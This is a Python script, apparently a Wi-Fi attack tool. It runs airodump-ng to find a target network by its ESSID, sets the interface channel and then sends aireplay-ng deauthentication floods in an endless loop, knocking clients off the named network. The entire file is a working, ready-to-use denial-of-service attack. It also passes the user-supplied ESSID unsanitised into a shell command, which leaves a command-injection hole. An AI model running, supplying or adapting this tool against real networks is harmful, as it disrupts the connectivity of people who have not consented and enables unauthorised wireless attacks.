import subprocess, time, sys, argparse









red = "\033[1;31m"

green = "\033[1;32m"

yellow = "\033[1;33m"

blue = "\033[1;34m"









def downLine( t = 12 ):

    sTime = time.time()

    length = 30

    while time.time() - sTime <= t:

        eTime = time.time() - sTime

        p = eTime / t

        line = f"\r{ green }Program is fishing 🎣: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"

        sys.stdout.write( line )

        sys.stdout.flush()

        time.sleep( 0.1 )









def iwCh( channel, interface ):

    try:

        cmd = f"sudo iwconfig { interface } channel { channel }"

        subprocess.run( cmd, shell = True, check = True )

        print( f"{ green }Channel is set to { channel } on { interface }\n\n" )

    except:

        print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        sys.exit( 0 )









def kiddDeAuth( BSSID, interface ):

    try:

        print( f"\n\n{ red }Program is roasting the fish!\n\n" )

        cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]

        p = subprocess.Popen( cmd )

        time.sleep( 20 )

        p.terminate()

        p.wait()

        print( f"\n\n{ green }Taking a nap 💤\n\n" )

        time.sleep( 60 )

        kiddDeAuth( BSSID, interface )

    except:

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )

        sys.exit( 0 )









def air( IF, ESSID ):

    ESSID = ESSID.lower()

    dic = {}

    f = open( "wifiInterF.txt", "w" )

    cmd = [ "sudo", "airodump-ng", "-i", IF ]

    p = subprocess.Popen( cmd, stdout = f )

    print( "\n\n" )

    downLine()

    p.terminate()

    p.wait()

    print( f"\n\n\n{ green }Program got fishbox\n\n" )

    cmd1 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID

    cmd2 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $7 }' > wifiChannel.py" % ESSID

    subprocess.run( cmd1, shell = True, check = True )

    time.sleep( 0.2 )

    subprocess.run( cmd2, shell = True, check = True )

    time.sleep( 0.2 )

    try:

        bFile = open( "wifiBssid.py", "r" )

        cFile = open( "wifiChannel.py", "r" )

        bssid = bFile.read().strip()

        chnel = cFile.read().strip()

        if bssid == "" or chnel == "":

            print( f"\n\n{ yellow }1. Run the script in a full-screen terminal\n2. Ensure the correct ESSID\n3. Ensure your IF is in monitor mode.\n\n" )

            sys.exit( 0 )

        else:

            dic[ "bssid" ] = bssid

            dic[ "channel" ] = chnel

    except:

        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        sys.exit( 0 )

    iwCh( dic[ "channel" ], IF )

    kiddDeAuth( dic[ "bssid" ], IF )









def main():

    creOpt = argparse.ArgumentParser( description = "How to use?" )

    creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

    creOpt.add_argument( "-e", "--essid", type = str, required = True, help = "ESSID or wifi name" )

    opt = creOpt.parse_args()

    air( opt.interface, opt.essid )

if __name__ == "__main__":

    main()
